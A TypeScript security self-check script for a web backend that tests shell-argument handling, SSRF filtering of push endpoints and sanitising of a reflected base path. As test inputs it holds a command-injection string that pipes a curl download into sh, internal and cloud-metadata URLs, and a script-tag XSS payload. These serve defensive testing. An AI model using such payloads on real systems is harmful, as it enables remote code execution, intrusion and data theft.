/**
 * Security hardening checks (real implementations):
 * 1. sandbox volume-subpath bootstrap never interpolates user-named dirs
 * 2. push subscription endpoints must be public https (no SSRF)
 * 3. reverse-proxy base path is validated before it is reflected
 *
 * Run: npx tsx cypress/component/support/security-check.ts
 * (assert-based self-check — no cypress/canvas needed)
 */
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const REPO = join(new URL('..', import.meta.url).pathname, '..', '..');
// Isolate state BEFORE backend imports (constants capture at module load).
const testDir = mkdtempSync(join(tmpdir(), 'sec-check-'));
process.env.AUTERE_PI_ENVS_DIR = join(testDir, 'pi-envs');
process.env.AUTERE_USERS_FILE = join(testDir, 'users.json');
writeFileSync(process.env.AUTERE_USERS_FILE, JSON.stringify({
  tester: { passwordHash: 's2:aa:bb', role: 'admin', allowedDirs: [] },
}));

let failures = 0;
function check(label: string, cond: boolean) {
  console.log(`${cond ? 'OK  ' : 'FAIL'} ${label}`);
  if (!cond) failures++;
}

const { volumeSubpathCommand } = await import(join(REPO, 'src/backend/pi-env.ts'));
const { validateSubscription } = await import(join(REPO, 'src/backend/notifications.ts'));
const { sanitizeBasePath } = await import(join(REPO, 'src/backend/routes.ts'));

// ── 1. Volume subpaths travel as argv, never into the script ──
const hostile = 'evil"; curl http://x | sh; "';
const cmd = volumeSubpathCommand(['work/repo-1', hostile], 1001, 1001);
check('script has no interpolated subpath', !cmd.script.includes(hostile) && !cmd.script.includes('curl'));
check('script reads positional params', cmd.script.includes('for s in "$@"'));
check('subpaths passed as argv after $0', cmd.args[0] === 'autere-subpaths' && cmd.args[2] === hostile);

// ── 2. Push endpoints ──
const sub = (endpoint: string) => ({ endpoint, keys: { p256dh: 'k', auth: 'a' } });
check('public https endpoint accepted',
  validateSubscription(sub('https://updates.push.services.mozilla.com/wpush/v2/abc')) === null);
check('plain http rejected', validateSubscription(sub('http://example.com/push')) !== null);
for (const bad of [
  'https://localhost/push',
  'https://127.0.0.1/push',
  'https://10.1.2.3/push',
  'https://192.168.1.1/push',
  'https://172.20.0.9/push',
  'https://169.254.169.254/latest/meta-data',
  'https://[::1]/push',
  'https://[fd00::1]/push',
]) {
  check(`internal endpoint rejected: ${bad}`, validateSubscription(sub(bad)) !== null);
}

// ── 3. Reflected base path ──
check('plain prefix accepted', sanitizeBasePath('/autere/') === '/autere');
check('script-breaking prefix rejected', sanitizeBasePath('/x</script><script>alert(1)</script>') === '');
check('absolute URL rejected', sanitizeBasePath('https://evil.example') === '');
check('dot segments rejected', sanitizeBasePath('/a/../b') === '');
check('quotes rejected', sanitizeBasePath('/a"b') === '');

if (failures) {
  console.log(`\n${failures} failure(s)`);
  process.exit(1);
}
console.log('\nAll security checks passed');
process.exit(0);
